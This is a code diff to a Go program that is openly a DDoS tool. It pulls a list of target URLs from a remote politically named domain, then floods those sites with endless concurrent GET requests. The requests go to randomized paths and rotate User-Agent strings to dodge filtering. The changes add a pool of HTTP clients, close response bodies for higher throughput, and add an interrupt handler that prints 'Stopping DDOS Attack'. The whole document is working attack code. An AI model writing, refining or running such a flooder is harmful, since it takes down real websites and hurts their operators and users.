@@ -1,15 +1,13 @@
-// Taiwan stand with Israel
 package main
 
 import (
-	"crypto/rand"
-	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"io/ioutil"
-	"math/big"
+	"math/rand"
 	"net/http"
 	"os"
+	"os/signal"
 	"strconv"
 	"strings"
 	"sync/atomic"
@@ -34,11 +32,12 @@ func main() {
 			fmt.Println("Invalid number of max goroutines, using default:", MaxGoroutines)
 		} else {
 			MaxGoroutines = maxGoroutines
-			fmt.Println("thread set to:", MaxGoroutines)
+			fmt.Println("threads set to:", MaxGoroutines)
 		}
 	}
 
-		// Attempt to fetch content from "https://fuck-hamas.com/targets.json"
+	rand.Seed(time.Now().UnixNano())
+
 	content, err := fetchContent("https://fuck-hamas.com/targets.json")
 	if err != nil {
 		fmt.Println("Error fetching content from https://fuck-hamas.com/targets.json. Using local targets.json")
@@ -46,10 +45,9 @@ func main() {
 		if err != nil {
 			panic(err)
 		}
-	} else {	
+	} else {
 		fmt.Println("Using remote targets.json")
-	}		
-	
+	}
 
 	var result Result
 	err = json.Unmarshal(content, &result)
@@ -65,8 +63,11 @@ func main() {
 	var userAgents []UserAgent
 	json.Unmarshal(content, &userAgents)
 
-	client := &http.Client{
-		Timeout: time.Second * 10,
+	clients := make([]*http.Client, MaxGoroutines)
+	for i := 0; i < MaxGoroutines; i++ {
+		clients[i] = &http.Client{
+			Timeout: time.Second * 10,
+		}
 	}
 
 	semaphore := make(chan struct{}, MaxGoroutines)
@@ -80,6 +81,15 @@ func main() {
 		}
 	}()
 
+	sigCh := make(chan os.Signal, 1)
+	signal.Notify(sigCh, os.Interrupt)
+	go func() {
+		<-sigCh
+		fmt.Println("Stopping DDOS Attack")
+
+		os.Exit(0)
+	}()
+
 	for {
 		for _, url := range result.URLs {
 			semaphore <- struct{}{}
@@ -87,22 +97,23 @@ func main() {
 				defer func() { <-semaphore }()
 
 				randomURL := generateRandomURL(url)
+				client := clients[rand.Intn(MaxGoroutines)]
+
 				req, err := http.NewRequest("GET", randomURL, nil)
 				if err != nil {
 					return
 				}
 
-				index, err := rand.Int(rand.Reader, big.NewInt(int64(len(userAgents))))
+				index := rand.Intn(len(userAgents))
+
+				req.Header.Set("User-Agent", userAgents[index].UserAgent)
+
+				resp, err := client.Do(req)
 				if err != nil {
 					return
 				}
+				resp.Body.Close()
 
-				req.Header.Set("User-Agent", userAgents[index.Int64()].UserAgent)
-
-				_, err = client.Do(req)
-				if err != nil {
-					return
-				}
 				atomic.AddUint64(&counter, 1)
 			}(url)
 		}
@@ -126,5 +137,5 @@ func generateRandomURL(url string) string {
 func randomHex(n int) string {
 	bytes := make([]byte, n)
 	rand.Read(bytes)
-	return hex.EncodeToString(bytes)
+	return fmt.Sprintf("%x", bytes)
 }
